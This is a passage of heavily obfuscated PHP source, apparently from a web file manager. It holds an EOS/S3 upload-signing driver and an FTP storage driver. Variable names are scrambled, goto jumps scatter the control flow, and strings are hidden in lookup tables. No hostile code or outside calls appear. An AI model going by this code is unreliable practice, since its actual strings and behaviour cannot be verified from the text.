!$b¨õô±™Í[$E‡•´¯æ¼±[367]]) { return !1; } $CÁî‰÷Ì§ = array($E‡•´¯æ¼±[29] => $E‡•´¯æ¼±[1459], $E‡•´¯æ¼±[1438] => USER_ID, $E‡•´¯æ¼±[89] => $B•¹¾ÚÙ¾», $E‡•´¯æ¼±[359] => $f‰¯ĞŠÚÈÀ); goto Aå»ÙøçÍÊ; Bİ·§±‡—: $E‡•´¯æ¼± =& $_SERVER[‚Ğ°–—î]; if (!$b¨õô±™Í) { return Model($E‡•´¯æ¼±[399])->where(array($E‡•´¯æ¼±[89] => $B•¹¾ÚÙ¾», $E‡•´¯æ¼±[29] => $E‡•´¯æ¼±[1459]))->delete(); } $f‰¯ĞŠÚÈÀ = json_encode($b¨õô±™Í); goto b®‘´˜‘; Aå»ÙøçÍÊ: Model($E‡•´¯æ¼±[399])->add($CÁî‰÷Ì§, array(), !0); goto Fº†¤©„¥á; Fº†¤©„¥á: } public static function log($FÍÌÚëç’) { write_log($FÍÌÚëç’, $_SERVER[‚Ğ°–—î][1461]); } } goto ağ‰Åª¯áò; F—§ÂÚ›œÏ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($f»èéÁåìã) { parent::__construct($f»èéÁåìã); $this->signatureVersion($_SERVER[‚Ğ°–—î][200]); } public function uploadFormData($B”Ëõ©»˜°, $f¢ÈÏ™¶ï¹ = 3600) { goto dÇİ×Ä³«; f¦‰ÙƒÁ”: $E´éÉÔä’ = array($DêÁíãº·Ô[199] => $DêÁíãº·Ô[33], $DêÁíãº·Ô[1146] => $DêÁíãº·Ô[33], $DêÁíãº·Ô[1105] => $BÇ¦’ÌåØ, $DêÁíãº·Ô[1109] => $còÉ÷ìã“Ğ, $DêÁíãº·Ô[1113] => $d˜µÉëßË, $DêÁíãº·Ô[1147] => $cŞçğßØ», $DêÁíãº·Ô[1148] => $EÛçŠ®“, $DêÁíãº·Ô[1149] => $e°¿ÏÀƒÒÓ, $DêÁíãº·Ô[1150] => $f†˜²ÙãšÍ, $DêÁíãº·Ô[1151] => $a­¦£Ë©à, $DêÁíãº·Ô[169] => $this->getHost()); return $E´éÉÔä’; goto DÛÄÓ×°; fÇØŞ™áêß: $d˜µÉëßË = base64_encode(json_encode($A¦„Ğ°‚îë)); $a”ñ°ˆ¦ˆ = hash_hmac($DêÁíãº·Ô[1144], $Cßî¡øÖÀ”, $DêÁíãº·Ô[1145] . $this->secret, !0); $cæ¸¯ğœ… = hash_hmac($DêÁíãº·Ô[1144], $this->region, $a”ñ°ˆ¦ˆ, !0); goto eç ‰©‚÷Š; FÄêÏŒ¹ŞÅ: $Béµ‰ÆôŞé = array($this->accessKey, $Cßî¡øÖÀ”, $this->region, $e¹“óî£µ±, $a“§§íïÆ); $cŞçğßØ» = implode($DêÁíãº·Ô[8], $Béµ‰ÆôŞé); $A¦„Ğ°‚îë = array($DêÁíãº·Ô[1103] => gmdate($DêÁíãº·Ô[1102], strtotime($DêÁíãº·Ô[1137])), $DêÁíãº·Ô[1104] => array(array($DêÁíãº·Ô[1106] => $this->bucket), array($DêÁíãº·Ô[1105] => $BÇ¦’ÌåØ), array($DêÁíãº·Ô[1107], $DêÁíãº·Ô[1108], $DêÁíãº·Ô[33]), array($DêÁíãº·Ô[1107], $DêÁíãº·Ô[1138], $DêÁíãº·Ô[33]), array($DêÁíãº·Ô[1107], $DêÁíãº·Ô[1139], $DêÁíãº·Ô[33]), array($DêÁíãº·Ô[1109] => $còÉ÷ìã“Ğ), array($DêÁíãº·Ô[1140] => $cŞçğßØ»), array($DêÁíãº·Ô[1141] => $EÛçŠ®“), array($DêÁíãº·Ô[1142] => $e°¿ÏÀƒÒÓ), array($DêÁíãº·Ô[1143] => $f†˜²ÙãšÍ))); goto fÇØŞ™áêß; Cˆ¤É õÛ›: $e¹“óî£µ± = $DêÁíãº·Ô[59]; $e°¿ÏÀƒÒÓ = gmdate($DêÁíãº·Ô[1135]); $Cßî¡øÖÀ” = gmdate($DêÁíãº·Ô[689]); goto e¼ñ­÷¶¢Û; dÇİ×Ä³«: $DêÁíãº·Ô =& $_SERVER[‚Ğ°–—î]; $BÇ¦’ÌåØ = $DêÁíãº·Ô[185]; $EÛçŠ®“ = $DêÁíãº·Ô[1134]; goto Cˆ¤É õÛ›; eç ‰©‚÷Š: $dÔÀ¯ÆàŒ² = hash_hmac($DêÁíãº·Ô[1144], $e¹“óî£µ±, $cæ¸¯ğœ…, !0); $C¡‹ç¯£´– = hash_hmac($DêÁíãº·Ô[1144], $a“§§íïÆ, $dÔÀ¯ÆàŒ², !0); $a­¦£Ë©à = hash_hmac($DêÁíãº·Ô[1144], $d˜µÉëßË, $C¡‹ç¯£´–); goto f¦‰ÙƒÁ”; e¼ñ­÷¶¢Û: $a“§§íïÆ = $DêÁíãº·Ô[1136]; $f†˜²ÙãšÍ = $f¢ÈÏ™¶ï¹ . $DêÁíãº·Ô[33]; $còÉ÷ìã“Ğ = $DêÁíãº·Ô[1101]; goto FÄêÏŒ¹ŞÅ; DÛÄÓ×°: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; private $config = array(); public function __construct($eÜÂã˜ä¬) { parent::__construct(); if (count($eÜÂã˜ä¬) > 0) { $this->_init($eÜÂã˜ä¬); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($f¡äÁ›¨ÀÄ) { $Dó‚ö¿îù =& $_SERVER[‚Ğ°–—î]; global $config; $this->appCharset = $config[$Dó‚ö¿îù[1152]]; $this->systemCharset = $config[$Dó‚ö¿îù[1153]]; if (isset($f¡äÁ›¨ÀÄ[$Dó‚ö¿îù[1154]]) && $f¡äÁ›¨ÀÄ[$Dó‚ö¿îù[1154]]) { $this->systemCharset = $f¡äÁ›¨ÀÄ[$Dó‚ö¿îù[1154]]; } } public function iconvApp($e•Ã›†­Ÿ) { return $this->iconvTo($e•Ã›†­Ÿ, $this->systemCharset, $this->appCharset); } public function iconvSystem($EÃøÊ±‹ÓÙ) { return $this->iconvTo($EÃøÊ±‹ÓÙ, $this->appCharset, $this->systemCharset); } public function getPathOuter($fåÏñˆİä) { goto bùêê‘¨³¥; bùêê‘¨³¥: $eİ÷ªç¨„ =& $_SERVER[‚Ğ°–—î]; $Fµ¬İ£òÉ = $this->iconvApp($this->pathBase); $fåÏñˆİä = $this->iconvApp($fåÏñˆİä); goto f˜–î…´Ç; f˜–î…´Ç: if (substr($Fµ¬İ£òÉ, 0, 2) == $eİ÷ªç¨„[1155]) { $Fµ¬İ£òÉ = BASIC_PATH . substr($Fµ¬İ£òÉ, 2); } if (substr($fåÏñˆİä, 0, 2) == $eİ÷ªç¨„[1155]) { $fåÏñˆİä = BASIC_PATH . substr($fåÏñˆİä, 2); } $Fµ¬İ£òÉ = KodIO::clear($Fµ¬İ£òÉ); goto e®§ÇÃàª; e®§ÇÃàª: $fåÏñˆİä = KodIO::clear($fåÏñˆİä); $fåÏñˆİä = substr($fåÏñˆİä, strlen($Fµ¬İ£òÉ)); if (empty($this->pathDriver)) { return $fåÏñˆİä; } goto B±”‹ÆŸ¡; B±”‹ÆŸ¡: return $this->pathDriver . $eİ÷ªç¨„[8] . ltrim($fåÏñˆİä, $eİ÷ªç¨„[8]); goto eŞ´ãŠ­…ß; eŞ´ãŠ­…ß: } private function _init($féùÕëµªƒ = array()) { $EÉ×¥à¢ =& $_SERVER[‚Ğ°–—î]; if (!function_exists($EÉ×¥à¢[1156])) { show_json(LNG($EÉ×¥à¢[1157]), !1); } $this->config = $féùÕëµªƒ; $this->charsetReset($féùÕëµªƒ); foreach ($féùÕëµªƒ as $FòÀÇ¾ÚÁ¹ => $C”ÈÏ®ÑïŸ) { if (isset($this->{$FòÀÇ¾ÚÁ¹})) { $this->{$FòÀÇ¾ÚÁ¹} = $C”ÈÏ®ÑïŸ; } } return $this->_login($féùÕëµªƒ); } private function _login($E”µÚ½±‡) { goto DŒˆÂÅ…“; fš¶Ÿˆõİ‹: return $F³¶¤Ëñ›Ã; goto DªÔæò²Á; a“ŸßÛì‰: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $bŞ›éŸ–ê–[$Fòğ©Â’Ç] = array($DôÔ•Ô¥¥£[1161] => $this->connect, $DôÔ•Ô¥¥£[169] => $this->host, $DôÔ•Ô¥¥£[168] => $this->scheme, $DôÔ•Ô¥¥£[170] => $this->port); goto fš¶Ÿˆõİ‹; dŒ¾ÙÙÂ‘°: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $F³¶¤Ëñ›Ã = @ftp_login($this->connect, $this->username, $this->userpass); goto a“ŸßÛì‰; DŒˆÂÅ…“: $DôÔ•Ô¥¥£ =& $_SERVER[‚Ğ°–—î]; static $bŞ›éŸ–ê– = array(); $Fòğ©Â’Ç = md5(json_encode($E”µÚ½±‡)); goto e¾ç¬ä¥™ß; e¾ç¬ä¥™ß: if (isset($bŞ›éŸ–ê–[$Fòğ©Â’Ç])) { foreach ($bŞ›éŸ–ê–[$Fòğ©Â’Ç] as $dí¶Â…í¡Ş => $F¤í‚¾Äóï) { $this->{$dí¶Â…í¡Ş} = $F¤í‚¾Äóï; } return !0; } $cŠï©‹ŒÁÃ = parse_url(trim($this->server, $DôÔ•Ô¥¥£[8])); $this->host = $cŠï©‹ŒÁÃ[$DôÔ•Ô¥¥£[169]]; goto D¥Ê…‚»ª³; D¥Ê…‚»ª³: $F“èÌ³¬Î„ = isset($cŠï©‹ŒÁÃ[$DôÔ•Ô¥¥£[168]]) && $cŠï©‹ŒÁÃ[$DôÔ•Ô¥¥£[168]] == $DôÔ•Ô¥¥£[1158] ? !0 : !1; $this->scheme = $F“èÌ³¬Î„ ? $DôÔ•Ô¥¥£[1159] : $DôÔ•Ô¥¥£[1160]; $this->port = isset($cŠï©‹ŒÁÃ[$DôÔ•Ô¥¥£[170]]) ? $cŠï©‹ŒÁÃ[$DôÔ•Ô¥¥£[170]] : 21; goto dŒ¾ÙÙÂ‘°; DªÔæò²Á: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($eƒ¬ºÛÚ‚ö, $CÜùòóèÁæ = '', $c¤¦ÉÑĞš = REPEAT_RENAME) { if ($this->setContent($eƒ¬ºÛÚ‚ö, $CÜùòóèÁæ)) { return $this->getPathOuter($eƒ¬ºÛÚ‚ö); } return !1; } public function mkdir($cÓÚ‡š÷—Ô, $A“ªİ‘ïˆ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $cÓÚ‡š÷—Ô = $this->iconvSystem($cÓÚ‡š÷—Ô); if ($this->isFolder($cÓÚ‡š÷—Ô) || @ftp_mkdir($this->connect, $cÓÚ‡š÷—Ô)) { return $this->getPathOuter($cÓÚ‡š÷—Ô); } if (!$this->mkdir($this->pathFather($cÓÚ‡š÷—Ô))) { return !1; } if ($cÓÚ‡š÷—Ô = @ftp_mkdir($this->connect, $cÓÚ‡š÷—Ô)) { return $this->getPathOuter($cÓÚ‡š÷—Ô); } return !1; } public function copyFile($fÃÎéâÍ®ï, $bÉÀàÁ¸‚ˆ) { goto EÒ¿ù¯ßÒ©; A•Ûğí²ß½: $EÛ„Ã‡í˜ = $this->iconvApp($C¢Å«ğÂ¾); $this->download($fÃÎéâÍ®ï, $EÛ„Ã‡í˜); $E »àŒŒ = $this->upload($bÉÀàÁ¸‚ˆ, $EÛ„Ã‡í˜); goto bîÄÌêÚÓ; EÒ¿ù¯ßÒ©: if (!$this->_isconn()) { return !1; } $fİŠøàï× = $this->pathThis($this->iconvSystem($fÃÎéâÍ®ï)); $C¢Å«ğÂ¾ = $this->tempFile($fİŠøàï×); goto A•Ûğí²ß½; bîÄÌêÚÓ: $this->tempFileRemve($C¢Å«ğÂ¾); return $E »àŒŒ; goto CŠğêÅÓŞ; CŠğêÅÓŞ: } public function moveFile($bÂ°åÎÀ, $BÇÁƒ¬ùÈĞ) { if (!$this->_isconn()) { return !1; } $bÂ°åÎÀ = $this->iconvSystem($bÂ°åÎÀ); $BÇÁƒ¬ùÈĞ = $this->iconvSystem($BÇÁƒ¬ùÈĞ); $Fîøõ¬òå½ = @ftp_rename($this->connect, $bÂ°åÎÀ, $BÇÁƒ¬ùÈĞ); return $Fîøõ¬òå½ ? $this->getPathOuter($BÇÁƒ¬ùÈĞ) : !1; } public function delFile($eÊ¨°‰¬) { if (!$this->_isconn()) { return !1; } $eÊ¨°‰¬ = $this->iconvSystem($eÊ¨°‰¬); return @ftp_delete($this->connect, $eÊ¨°‰¬); } public function delFolder($fİµƒì½ÈÓ) { if (!$this->_isconn()) { return !1; } $fİµƒì½ÈÓ = $this->iconvSystem($fİµƒì½ÈÓ); $A•èÍÆá–± = $this->ftpList($fİµƒì½ÈÓ); if (!$A•èÍÆá–±) { return @ftp_rmdir($this->connect, $fİµƒì½ÈÓ); } foreach ($A•èÍÆá–± as $d¸Ò÷³¢‰) { if ($this->isFolder($d¸Ò÷³¢‰)) { $d¸Ò÷³¢‰ = $this->iconvApp($d¸Ò÷³¢‰); $this->delFolder($d¸Ò÷³¢‰); } else { @ftp_delete($this->connect, $d¸Ò÷³¢‰); } } return @ftp_rmdir($this->connect, $fİµƒì½ÈÓ); } public function rename($fÊ¤‚Ù‹µŸ, $A¸³˜„µ®) { goto c‚ªô÷ØÁ; A½Í ‰Íø: $E’ˆ¸¨Œ¨¬ = $this->iconvSystem($E’ˆ¸¨Œ¨¬); $fÊ¤‚Ù‹µŸ = $this->iconvSystem($fÊ¤‚Ù‹µŸ); $DË“ÀÀÔµ = $this->pathFather($fÊ¤‚Ù‹µŸ); goto b‡©ÆäÀõ; CÑÂÏ¦½ˆ‘: return $Eó–—æÃÊ ? $this->getPathOuter($fòÕ›¾‹£) : !1; goto F–çŠÎà×Å; c‚ªô÷ØÁ: $aôƒãÛˆí“ =& $_SERVER[‚Ğ°–—î]; if (!$this->_isconn()) { return !1; } $E’ˆ¸¨Œ¨¬ = $this->fileNameAuto($this->pathFather($fÊ¤‚Ù‹µŸ), $A¸³˜„µ®); goto A½Í ‰Íø; b‡©ÆäÀõ: $fòÕ›¾‹£ = rtrim($DË“ÀÀÔµ, $aôƒãÛˆí“[8]) . $aôƒãÛˆí“[8] . $E’ˆ¸¨Œ¨¬; $Eó–—æÃÊ = @ftp_rename($this->connect, $fÊ¤‚Ù‹µŸ, $fòÕ›¾‹£); $fòÕ›¾‹£ = $this->iconvApp($fòÕ›¾‹£); goto CÑÂÏ¦½ˆ‘; F–çŠÎà×Å: } private function folderInfo($AÏ…òÅ¸¢Š, $AçŒØÅÆó‰ = false) { goto bİ±¸ÒÚîï; EĞÙÍíñ¡: return $FÊí§’¼À; goto cõ‘Îö‘¹; eªœƒ’‡ôà: $f ÑÕ’ò‰é = $this->iconvSystem($AÏ…òÅ¸¢Š); if ($AçŒØÅÆó‰) { return array($e¬°‚¹¶šâ[28] => $AÏ¡°†‡ÈÔ, $e¬°‚¹¶šâ[75] => $a¨ø†Ää†, $e¬°‚¹¶šâ[29] => $e¬°‚¹¶šâ[76]); } $FÊí§’¼À = array($e¬°‚¹¶šâ[28] => $AÏ¡°†‡ÈÔ, $e¬°‚¹¶šâ[75] => $a¨ø†Ää†, $e¬°‚¹¶šâ[29] => $e¬°‚¹¶šâ[76], $e¬°‚¹¶šâ[187] => 0, $e¬°‚¹¶šâ[107] => 0, $e¬°‚¹¶šâ[1162] => !0, $e¬°‚¹¶šâ[1163] => !0); goto EĞÙÍíñ¡; bİ±¸ÒÚîï: $e¬°‚¹¶šâ =& $_SERVER[‚Ğ°–—î]; $a¨ø†Ää† = $this->getPathOuter(rtrim($AÏ…òÅ¸¢Š, $e¬°‚¹¶šâ[8])); $AÏ¡°†‡ÈÔ = $this->pathThis($a¨ø†Ää†); goto eªœƒ’‡ôà; cõ‘Îö‘¹: } private function fileInfo($BÀÅ§Ø›Ñª, $C»„¦’Ñê = false) { goto bÙùïØ¡ä³; bš¯èë¢¯’: $A¤˜ËÑ¿Š[$Eº¶íĞêøÁ[107]] = $A¤˜ËÑ¿Š[$Eº¶íĞêøÁ[107]] > 0 ? $A¤˜ËÑ¿Š[$Eº¶íĞêøÁ[107]] : 0; return $A¤˜ËÑ¿Š; goto AÇÏËñ”; BÛ­ª¹÷öõ: $Ašê§šµŠ› = $this->iconvSystem($BÀÅ§Ø›Ñª); if ($C»„¦’Ñê) { return array($Eº¶íĞêøÁ[28] => $A‚í¹ŒÅ·ç, $Eº¶íĞêøÁ[75] => $dÎåÍğàÀ„, $Eº¶íĞêøÁ[29] => $Eº¶íĞêøÁ[167], $Eº¶íĞêøÁ[160] => $this->ext($BÀÅ§Ø›Ñª), $Eº¶íĞêøÁ[77] => $this->size($BÀÅ§Ø›Ñª)); } $A¤˜ËÑ¿Š = array($Eº¶íĞêøÁ[28] => $A‚í¹ŒÅ·ç, $Eº¶íĞêøÁ[75] => $dÎåÍğàÀ„, $Eº¶íĞêøÁ[29] => $Eº¶íĞêøÁ[167], $Eº¶íĞêøÁ[187] => 0, $Eº¶íĞêøÁ[107] => @ftp_mdtm($this->connect, $Ašê§šµŠ›), $Eº¶íĞêøÁ[160] => $this->ext($BÀÅ§Ø›Ñª), $Eº¶íĞêøÁ[77] => $this->size($BÀÅ§Ø›Ñª), $Eº¶íĞêøÁ[1162] => !0, $Eº¶íĞêøÁ[1163] => !0); goto bš¯èë¢¯’; bÙùïØ¡ä³: $Eº¶íĞêøÁ =& $_SERVER[‚Ğ°–—î]; $dÎåÍğàÀ„ = $this->getPathOuter(rtrim($BÀÅ§Ø›Ñª, $Eº¶íĞêøÁ[8])); $A‚í¹ŒÅ·ç = $this->pathThis($dÎåÍğàÀ„); goto BÛ­ª¹÷öõ; AÇÏËñ”: } public function size($cøÚ¬êÈ½) { $d„Õí´’Ú = $this->objectMeta($cøÚ¬êÈ½); return $d„Õí´’Ú ? $d„Õí´’Ú[$_SERVER[‚Ğ°–—î][77]] : 0; } public function info($cã‡Æ³¼õ¨) { if ($this->isFile($cã‡Æ³¼õ¨)) { return $this->fileInfo($cã‡Æ³¼õ¨, 0); } else { if ($this->isFolder($cã‡Æ³¼õ¨)) { return $this->folderInfo($cã‡Æ³¼õ¨); } } return !1; } public function exist($Fîˆˆ…Š‰·) { return $this->objectMeta($Fîˆˆ…Š‰·) ? !0 : !1; } public function isFile($cŠÂ•…º÷ ) { $Bº—²…£… =& $_SERVER[‚Ğ°–—î]; $C‚ÓŞÛËÏ = $this->objectMeta($cŠÂ•…º÷ ); return $C‚ÓŞÛËÏ ? $C‚ÓŞÛËÏ[$Bº—²…£…[29]] == $Bº—²…£…[167] : !1; } public function isFolder($fù‡ÃŞï«) { $c™ÍÜÄ›°´ =& $_SERVER[‚Ğ°–—î]; $d‹­Ó¹¢ß« = $this->objectMeta($fù‡ÃŞï«); return $d‹­Ó¹¢ß« ? $d‹­Ó¹¢ß«[$c™ÍÜÄ›°´[29]] == $c™ÍÜÄ›°´[76] : !1; } public function listPath($A¡è‘Ô¤¼ä, $eøè’âÊó = false) { goto FË†§Éù; FêƒÚà¬ÇË: foreach ($F…£É‹Şâ£ as $A¡è‘Ô¤¼ä) { if ($this->isFolder($A¡è‘Ô¤¼ä)) { $f…Èõ˜‡…Ÿ[$Fì„è„ìò•[74]][] = $this->folderInfo($A¡è‘Ô¤¼ä, $eøè’âÊó); } else { $f…Èõ˜‡…Ÿ[$Fì„è„ìò•[73]][] = $this->fileInfo($A¡è‘Ô¤¼ä, $eøè’âÊó); } } return $f…Èõ˜‡…Ÿ; goto CÃİ×¡í‡; FË†§Éù: $Fì„è„ìò• =& $_SERVER[‚Ğ°–—î]; if (!$this->_isconn()) { return !1; } $A¡è‘Ô¤¼ä = $this->iconvSystem($A¡è‘Ô¤¼ä); goto A”¢³å•©; A”¢³å•©: $F…£É‹Şâ£ = $this->ftpList($A¡è‘Ô¤¼ä); $f…Èõ˜‡…Ÿ = array($Fì„è„ìò•[74] => array(), $Fì„è„ìò•[73] => array()); if (!$F…£É‹Şâ£) { return $f…Èõ˜‡…Ÿ; } goto FêƒÚà¬ÇË; CÃİ×¡í‡: } public function has($BŸÑŠ§Ò, $cÓìç§°‰Š = false, $e£¯”Âó = true) { goto DÁÆİ­¯Šè; DÁÆİ­¯Šè: $fÚ¸«·Šà =& $_SERVER[‚Ğ°–—î]; if (!$this->_isconn()) { return !1; } $BŸÑŠ§Ò = $this->iconvSystem($BŸÑŠ§Ò); goto E‘››ä…À; E‘››ä…À: $BŸÎÏ¼Ù = $this->ftpList($BŸÑŠ§Ò); if (!$BŸÎÏ¼Ù) { return !1; } if ($cÓìç§°‰Š) { return array($fÚ¸«·Šà[191] => 0, $fÚ¸«·Šà[192] => count($BŸÎÏ¼Ù)); } goto eÛ²ÓÁ¯Å; eÛ²ÓÁ¯Å: foreach ($BŸÎÏ¼Ù as $BŸÑŠ§Ò) { if ($e£¯”Âó) { if (!$this->isFolder($BŸÑŠ§Ò)) { return !0; } } else { if ($this->isFolder($BŸÑŠ§Ò)) { return !0; } } } return !1; goto F…ŒñÇáÛö; F…ŒñÇáÛö: } public function listAll($d°¯é§ñå¹) { goto f“’âö¿‡„; d©´šªî›ï: foreach ($AÈµ—‚¨Œ[$aÑâà²ÈÒ[74]] as $dÂÆµ¾…§ß) { $b…çÌ©Ï[] = array($aÑâà²ÈÒ[75] => $aÑâà²ÈÒ[8] . trim(str_replace($d°¯é§ñå¹, $aÑâà²ÈÒ[33], $dÂÆµ¾…§ß), $aÑâà²ÈÒ[8]) . $aÑâà²ÈÒ[8], $aÑâà²ÈÒ[76] => 1, $aÑâà²ÈÒ[77] => 0); } foreach ($AÈµ—‚¨Œ[$aÑâà²ÈÒ[73]] as $F‡Ä‡§àñ) { $b…çÌ©Ï[] = array($aÑâà²ÈÒ[75] => $aÑâà²ÈÒ[8] . trim(str_replace($d°¯é§ñå¹, $aÑâà²ÈÒ[33], $F‡Ä‡§àñ), $aÑâà²ÈÒ[8]), $aÑâà²ÈÒ[76] => 0, $aÑâà²ÈÒ[77] => $this->size($F‡Ä‡§àñ)); } return $b…çÌ©Ï; goto FòÀĞìµË°; BÊ¹›å‹: $AÈµ—‚¨Œ = array($aÑâà²ÈÒ[73] => array(), $aÑâà²ÈÒ[74] => array()); $this->recursionFtpFiles($d°¯é§ñå¹, $AÈµ—‚¨Œ); $b…çÌ©Ï = array(); goto d©´šªî›ï; f“’âö¿‡„: $aÑâà²ÈÒ =& $_SERVER[‚Ğ°–—î]; if (!$this->_isconn()) { return !1; } $d°¯é§ñå¹ = $this->iconvSystem($d°¯é§ñå¹); goto BÊ¹›å‹; FòÀĞìµË°: } public function getContent($f›ô°ÕÙâ¬) { if (!$this->_isconn()) { return !1; } $f›ô°ÕÙâ¬ = $this->iconvSystem($f›ô°ÕÙâ¬); return $this->fileSubstr($f›ô°ÕÙâ¬); } public function setContent($dø‚Š¨ô¾¸, $c…‡ÆÏŞî = '') { goto e‡šÒ™¾Ô; Cç¶œİÑØÌ: file_put_contents($aŞ×¨‰¢, $c…‡ÆÏŞî); $D¾¶Ä¤Å‹Š = $this->upload($dø‚Š¨ô¾¸, $this->iconvApp($aŞ×¨‰¢)); $this->tempFileRemve($aŞ×¨‰¢); goto B„ÅÄƒá; e‡šÒ™¾Ô: if (!$this->_isconn()) { return !1; } $EíÈ²›¥™Ê = $this->pathThis($this->iconvSystem($dø‚Š¨ô¾¸)); $aŞ×¨‰¢ = $this->tempFile($EíÈ²›¥™Ê); goto Cç¶œİÑØÌ; B„ÅÄƒá: return $D¾¶Ä¤Å‹Š; goto fÉÚîƒĞ²¦; fÉÚîƒĞ²¦: } public function fileSubstr($eÜê‰ÛÁ‹Ç, $AÛåšªÈÚ… = 0, $A£ÑÆö¬´ì = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($eÜê‰ÛÁ‹Ç, $AÛåšªÈÚ…, $A£ÑÆö¬´ì); } private function ftpRequest($dö¬Î‚¿¸, $b‡í’ĞÓƒÕ = 0, $E¾§íÂù¸¿ = false) { goto cÈÎ˜£ÌÁ…; bÒäêÏØÚç: curl_setopt($fÇÏ‰¨…, CURLOPT_URL, $d·öçå¤†Ö . $this->pathEncode($dö¬Î‚¿¸)); curl_setopt($fÇÏ‰¨…, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($E¾§íÂù¸¿) { $C¹ÍÀôÎêİ = $b‡í’ĞÓƒÕ + $E¾§íÂù¸¿ - 1; curl_setopt($fÇÏ‰¨…, CURLOPT_RANGE, "{$b‡í’ĞÓƒÕ}\x2d{$C¹ÍÀôÎêİ}"); } goto D·‡†ã»Ğƒ; D·‡†ã»Ğƒ: curl_setopt($fÇÏ‰¨…, CURLOPT_RETURNTRANSFER, 1); $B¡¼¥‡ó©ß = curl_exec($fÇÏ‰¨…); curl_close($fÇÏ‰¨…); goto EŸçß¬¦‘ª; EŸçß¬¦‘ª: return $B¡¼¥‡ó©ß; goto A„‰Šã‹Ú¦; cÈÎ˜£ÌÁ…: $dö¬Î‚¿¸ = $this->iconvSystem($dö¬Î‚¿¸); $d·öçå¤†Ö = $this->scheme . $this->host . $_SERVER[‚Ğ°–—î][4] . $this->port; $fÇÏ‰¨… = curl_init(); goto bÒäêÏØÚç; A„‰Šã‹Ú¦: } public function upload($b÷“‰ëĞå, $e¤ø´–‚ƒé, $bÚÃ×‚ÇŠ„ = false, $FÊĞŸÌË§Ì = REPEAT_REPLACE) { goto bñÊ¯‘ÈÃŸ; f±öå»çÇ¡: if ($c–³×Î—Üˆ != FTP_FINISHED) { return !1; } return $this->getPathOuter($b÷“‰ëĞå); goto dÃùœ½ª•ˆ; dõ”† ‡ñŸ: $e¤ø´–‚ƒé = $this->iconvSystem($e¤ø´–‚ƒé); $c–³×Î—Üˆ = ftp_nb_put($this->connect, $b÷“‰ëĞå, $e¤ø´–‚ƒé, FTP_BINARY); while ($c–³×Î—Üˆ == FTP_MOREDATA) { $c–³×Î—Üˆ = ftp_nb_continue($this->connect); } goto f±öå»çÇ¡; bñÊ¯‘ÈÃŸ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($b÷“‰ëĞå))) { return !1; } $b÷“‰ëĞå = $this->iconvSystem($b÷“‰ëĞå); goto dõ”† ‡ñŸ; dÃùœ½ª•ˆ: } public function download($Eë…¦È‘š†, $bÕÏ³İœ…‚ = '') { goto D›Í¦¼ªá³; E÷·Â†í‹Ğ: while ($cîŒà¥Ù¼“ == FTP_MOREDATA) { $cîŒà¥Ù¼“ = ftp_nb_continue($this->connect); } if ($cîŒà¥Ù¼“ != FTP_FINISHED) { return !1; } return $this->iconvApp($bÕÏ³İœ…‚); goto eÙĞÕœ•Ê÷; aßÊÙ÷ÃËÏ: $Eë…¦È‘š† = $this->iconvSystem($Eë…¦È‘š†); $bÕÏ³İœ…‚ = $this->iconvSystem($bÕÏ³İœ…‚); $cîŒà¥Ù¼“ = ftp_nb_get($this->connect, $bÕÏ³İœ…‚, $Eë…¦È‘š†, FTP_BINARY); goto E÷·Â†í‹Ğ; D›Í¦¼ªá³: if (!$this->_isconn()) { return !1; } $F£Ë…”•¢¤ = $this->pathFather($bÕÏ³İœ…‚); if (!IO::mkdir($F£Ë…”•¢¤)) { return !1; } goto aßÊÙ÷ÃËÏ; eÙĞÕœ•Ê÷: } private function ftpList($C“á°¶÷ÉÌ) { goto eƒç‹‹ƒãÑ; eƒç‹‹ƒãÑ: $AØİÂŞïÆ =& $_SERVER[‚Ğ°–—î]; if (!$this->isFolder($C“á°¶÷ÉÌ)) { return !1; } @ftp_chdir($this->connect, $AØİÂŞïÆ[8]); goto eØ¾Ó¿ƒóî; a“ØÃøöÚ—: $DˆİÃŒÚêµ = array($AØİÂŞïÆ[91], $AØİÂŞïÆ[1165], $C“á°¶÷ÉÌ . $AØİÂŞïÆ[91], $C“á°¶÷ÉÌ . $AØİÂŞïÆ[1165]); $aŸ°ÂÒÄø = array_diff($aŸ°ÂÒÄø, $DˆİÃŒÚêµ); $A¼½Á„¯Öö = array(); goto aö¤¼àˆ÷À; aö¤¼àˆ÷À: foreach ($aŸ°ÂÒÄø as $C‡îÇòÏÄœ) { if (!strstr($C‡îÇòÏÄœ, $AØİÂŞïÆ[8])) { $C‡îÇòÏÄœ = $C“á°¶÷ÉÌ . ltrim($C‡îÇòÏÄœ, $AØİÂŞïÆ[8]); } $A¼½Á„¯Öö[] = $this->iconvApp($C‡îÇòÏÄœ); } return $A¼½Á„¯Öö; goto eè”Øˆ´¿; eØ¾Ó¿ƒóî: $C“á°¶÷ÉÌ = rtrim($C“á°¶÷ÉÌ, $AØİÂŞïÆ[8]) . $AØİÂŞïÆ[8]; $aŸ°ÂÒÄø = @ftp_nlist($this->connect, $C“á°¶÷ÉÌ); if ($aŸ°ÂÒÄø === !1) { $aŸ°ÂÒÄø = @ftp_rawlist($this->connect, $C“á°¶÷ÉÌ); foreach ($aŸ°ÂÒÄø as $c·äµ£½“‡ => $fšİÁá•®) { $aŸ°ÂÒÄø[$c·äµ£½“‡] = end(explode($AØİÂŞïÆ[1164], $fšİÁá•®)); } } goto a“ØÃøöÚ—; eè”Øˆ´¿: } private function recursionFtpFiles($C¬¦²ªôÔ¶, &$A¼Ú·»ö†ï) { $EƒÖŞéŒ =& $_SERVER[‚Ğ°–—î]; if (!$this->_isconn()) { return !1; } if (!($B¥ÏĞ¾Ä¿ƒ = $this->ftpList($C¬¦²ªôÔ¶))) { return !1; } foreach ($B¥ÏĞ¾Ä¿ƒ as $C¬¦²ªôÔ¶) { if 